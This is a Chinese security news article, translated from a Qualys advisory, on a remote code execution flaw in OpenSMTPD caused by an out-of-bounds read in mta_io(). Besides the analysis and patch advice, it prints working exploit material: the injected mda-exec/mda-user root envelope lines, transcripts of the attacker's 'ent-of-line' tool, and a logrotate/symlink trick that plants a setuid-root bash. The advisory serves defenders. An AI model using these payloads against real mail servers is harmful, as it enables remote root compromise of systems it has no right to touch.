**安全人员在OpenBSD SMTP中发现了一个存在长达4年的漏洞，攻击者可利用该漏洞远程执行代码，多个linux发行版本受到影响。**

## 综述

近期在OpenBSD邮件服务器中发现了一个漏洞。此漏洞是在2015年12月引入的越界读取（commit
80c6a60c）。攻击者可远程利用该漏洞，在18年5月前可以非root权限执行任意shell命令， 2018年5月之后（commit
a8e22235）可以root权限执行shell命令。

因为此漏洞位于OpenSMTPD的客户端代码中，需要考虑两个不同的情况：

### 客户端利用

在OpenSMTPD（因此也是OpenBSD）的默认配置中可以远程利用此漏洞。OpenSMTPD仅监听本地主机，默认情况下，它接受来自本地用户的邮件并将其传递到远程服务器。如果远程服务器是被攻击者控制，攻击者可以在存在漏洞的OpenSMTPD上执行任意shell命令。

### 服务器端利用

首先，攻击者必须连接到OpenSMTPD服务器（该服务器接受外部邮件）并发送bounce邮件。当OpenSMTPD重新连接到邮件服务器传递bounce时，攻击者可以利用OpenSMTPD的客户端漏洞。攻击者必须使OpenSMTPD崩溃并等待它重新启动后才能执行命令。

## 影响版本

安全人员已针对漏洞开发利用程序与补丁，漏洞存在版本：OpenBSD 6.6（当前版本），OpenBSD 5.9，Debian 10（稳定版），Debian
11（测试版）和Fedora 31。

## 漏洞分析

SMTP客户端连接到SMTP服务器并发送EHLO、MAIL FROM和RCPT TO等命令。SMTP服务器以单行或多行回复：

第一行以三位数代码和连字符（'-'）开头，后跟可选文本（例如，“250-ENHANCEDSTATUSCODES”）；

最后一行以相同的三位数代码开头，后跟可选空格（' '）和文本（例如，“250 HELP”）。

在OpenSMTPD的客户端代码中，这些多行应答由mta_io（）函数处理：

    
    
    1098 static void
    1099 mta_io(struct io *io, int evt, void *arg)
    1100 {
    ....
    1133         case IO_DATAIN:
    1134             nextline:
    1135                 line = io_getline(s->io, &len);
    ....
    1146                 if ((error = parse_smtp_response(line, len, &msg, &cont))) {  
    

第一行 (when line[3] == '-')会链接到一个大小为2KB的replybuf：  

    
    
    1177                 if (cont) {
    1178                         if (s->replybuf[0] == '\0')
    1179                                 (void)strlcat(s->replybuf, line, sizeof s->replybuf);
    1180                         else {
    1181                                 line = line + 4;
    ....
    1187                                         (void)strlcat(s->replybuf, line, sizeof s->replybuf);
    1188                         }
    1189                         goto nextline;
    1190                 }  
    

最后一行 (when line[3] != '-') 会链接到replybuf：  

    
    
    1195                 if (s->replybuf[0] != '\0') {
    1196                         p = line + 4;
    ....
    1201                         if (strlcat(s->replybuf, p, sizeof s->replybuf) >= sizeof s->replybuf)  
    

如果最后一行的三位数代码后面没有可选的空格和文本，p（在1196行）指向'\0'后的第一个字符，越界字符串链接到repeatbuf（在第1201行）。

### 如何利用越界读取执行命令  

1、在回复的最后一行精确控制“越界”字符串，OpenSMTPD会以块为单位读取我们的回复，而不是逐字符读取。如果发送的最后为"xyz\nstring\0"，“
string”会链接到repeatbuf中。

2、如果回复的三位数代码表示暂时错误（4yz）或永久错误（5yz），则Replybuf的内容会写入"errorline"字段并尝试传递邮件。

3、邮件基本形式为： “ field：data \ n”，构造好的越界字符串（写入"errorline"字段）可以包含“ \
n”字符：因此可以在邮件中插入新一行内容并更改OpenSMTPD的行为。

### 客户端漏洞利用

可直接利用客户端漏洞，等待OpenSMTPD连接到服务器，利用多行应答创建 bounce并注入以下内容：

> type: mda
>
> mda-exec: shell command
>
> dispatcher: local_mail
>
> mda-user: root

“local_mail”是OpenSMTPD的本地调度器的名称（默认配置），当OpenSMTPD尝试传递bounce时，MDA命令会立即执行，因为注入内容已将其类型从MTA（Message
Transfer Agent）更改为MDA（Message Delivery Agent），示例如下：

首先，在OpenBSD机器上，本地用户发送一封邮件（其中“[192.168.56.1]”是攻击者邮件服务器的IP地址）

    
    
    $ id
    uid=1001(john) gid=1001(john) groups=1001(john)
    
    $ echo test | /usr/sbin/sendmail 'test@[192.168.56.1]'  
    

在攻击者邮件服务器上：

    
    
    # ./ent-of-line
    ...
    Connection from 192.168.56.104:39404
    ...
    <-- MAIL FROM:<john@obsd66.example.org>
    --> 553-Error
    --> 553
    
    type:mda
    mda-exec:X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
    dispatcher:local_mail
    mda-user:root  
    

最后在OpenBSD机器上会执行命令：

    
    
    # cat /tmp/x.*
    uid=0(root) gid=0(wheel) groups=0(wheel)  
    

### 服务器端漏洞利用

服务器端漏洞利用更为复杂，需要面对三个问题：

1、漏洞代码位于客户端而不是服务端，因此需要连接到OpenSMTPD服务器，通过发送邮件生成bounce，等待OpenSMTPD回连到自己的邮件服务器。

2、不能利用‘permanent error’回复bounce消息，服务器会直接丢弃（double bounce），因此可以利用‘temporary
error’回复并注入内容。

3、OpenSMTPD不会立刻执行注入的MDA命令，bounce会在其MTA队列之中而不是MDA队列，因此需要使OpenSMTPD服务崩溃从而导致内存丢失，重启后就会立刻执行MDA中的命令。

示例如下：

首先在攻击者邮件服务器中（"192.168.56.104"为OpenBSD机器，"192.168.56.1"为攻击者邮件服务器，“root@example.org”是OpenBSD计算机上的有效邮件地址）：

    
    
    # ./ent-of-line 192.168.56.104 'test@[192.168.56.1]' root@example.org
    ...
    Connected to 192.168.56.104:25
    ...
    --> MAIL FROM:<test@[192.168.56.1]>
    <-- 250 2.0.0 Ok
    --> RCPT TO:<root@example.org> NOTIFY=SUCCESS
    <-- 250 2.1.5 Destination address valid: Recipient ok
    ...
    Connection from 192.168.56.104:40061
    ...
    <-- MAIL FROM:<>
    --> 421-Error
    --> 421
    
    type:mda
    mda-exec:X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
    dispatcher:local_mail
    mda-user:root
    
    Connected to 192.168.56.104:25
    ...
    --> MAIL FROM:<test@[192.168.56.1]>
    <-- 250 2.0.0 Ok
    --> RCPT TO:<root@example.org> NOTIFY=SUCCESS
    <-- 250 2.1.5 Destination address valid: Recipient ok
    ...
    Connection from 192.168.56.104:20037
    ...
    <-- MAIL FROM:<>
    --> 421-Error
    --> 421
    
    type:invalid  
    

OpenBSD计算机中（管理员重启OpenSMTPD前后）:

    
    
    # cat /tmp/x.*
    cat: /tmp/x.*: No such file or directory
    
    # rcctl restart smtpd
    smtpd(ok)
    
    # cat /tmp/x.*
    uid=0(root) gid=0(wheel) groups=0(wheel)  
    

### 旧版本漏洞利用

在旧版本的利用方式如下，注入内容为：

    
    
    type: mda
    mda-buffer: our arbitrary shell command
    mda-method: mda
    mda-user: nobody
    mda-usertable: <getpwnam>  
    

首先攻击者邮件服务器中：（"192.168.56.141"是Debian计算机，"192.168.56.1"是攻击者邮件服务器，“root@example.org”是Debian计算机上的有效邮件地址）

    
    
    # ./ent-of-line -u nobody 192.168.56.141 'test@[192.168.56.1]' root@example.org
    ...
    Connected to 192.168.56.141:25
    ...
    --> MAIL FROM:<test@[192.168.56.1]>
    <-- 250 2.0.0: Ok
    --> RCPT TO:<root@example.org> NOTIFY=SUCCESS
    <-- 250 2.1.5 Destination address valid: Recipient ok
    ...
    Connection from 192.168.56.141:35378
    ...
    <-- MAIL FROM:<>
    --> 421-Error
    --> 421
    
    type:mda
    mda-buffer:X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0
    mda-method:mda
    mda-user:nobody
    mda-usertable:<getpwnam>
    
    Connected to 192.168.56.141:25
    ...
    --> MAIL FROM:<test@[192.168.56.1]>
    <-- 250 2.0.0: Ok
    --> RCPT TO:<root@example.org> NOTIFY=SUCCESS
    <-- 250 2.1.5 Destination address valid: Recipient ok
    ...
    Connection from 192.168.56.141:35380
    ...
    <-- MAIL FROM:<>
    --> 421-Error
    --> 421
    
    type:invalid  
    

在Debian重启前后：

    
    
    # cat /tmp/x.*
    cat: '/tmp/x.*': No such file or directory
    
    # systemctl restart opensmtpd.service
    
    # cat /tmp/x.*
    uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)  
    

Debian中（攻击者攻击中含有‘nobody’命令）：

    
    
    $ id
    uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
    
    $ mkdir -m 0700 /tmp/maildir
    $ cd /tmp/maildir
    
    $ ln -s /etc tmp
    $ ln -s /etc/logrotate.d new
    
    $ /usr/sbin/sendmail 'test@[192.168.56.1]' << 'EOF'
    /var/log/lastlog {
        missingok
        rotate 1
        nomail
        size 1
        copy
        firstaction
            cp -f /bin/bash /var/log && chmod 04555 /var/log/bash
        endscript
    }
    EOF  
    

在攻击者服务器中：

    
    
    # ./ent-of-line -m /tmp/maildir
    ...
    Connection from 192.168.56.141:35382
    ...
    <-- MAIL FROM:<nobody@debian>
    --> 553-Error
    --> 553
    
    type:mda
    mda-buffer:/tmp/maildir
    mda-method:maildir
    mda-user:root
    mda-usertable:<getpwnam>  
    

最后在Debian机器中：

    
    
    $ id
    uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
    
    $ /var/log/bash -p
    
    # id
    uid=65534(nobody) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)  
    

## 建议  

OpenSMTPD
6.6.4p1中发布了[安全修复程序](https://github.com/OpenSMTPD/OpenSMTPD/releases)。在OpenBSD上可以通过运行“syspatch”命令打上补丁，并重启OpenSMTPD服务。

 ***参考来源：[qualys](https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install.txt)，由Kriston编译，转载请注明来自FreeBuf.COM**

